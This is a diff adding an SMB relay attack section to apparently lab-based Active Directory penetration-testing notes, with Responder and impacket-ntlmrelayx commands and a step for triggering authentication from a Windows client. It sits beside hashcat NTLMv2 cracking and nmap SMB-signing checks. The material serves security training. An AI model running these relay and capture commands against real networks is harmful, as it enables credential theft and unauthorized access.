@@ -274,4 +274,34 @@ hashcat -a 0 -m 5600 hashfile.txt your-wordlist-location
 nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24
 ```
 
+**SMB Relay Attack**:
+
+- Put one of the IP of testing `Windows Machine` into targets.txt for **ntlmrelayx** tool.
+
+- Then `turn off` **SMB** and **HTTP** in the `Responder.conf` file.
+
+- command for responder.py will be same as:
+
+```
+responder -I eth0 -dwv
+```
+
+- command for ntlmrelayx:
+
+```
+impacket-ntlmrelayx -tf targets.txt -smb2support
+```
+
+**Trigger the Action**:
+
+- Put the Attacker machine IP in the address bar of Windows Client Machine filemanager.
+
+![](imgs/addsimg09.png)
+
+
+- Under your ntlmrelayx command, you'll notice output like this:
+
+![](imgs/addsimg10.png)
+
+
 
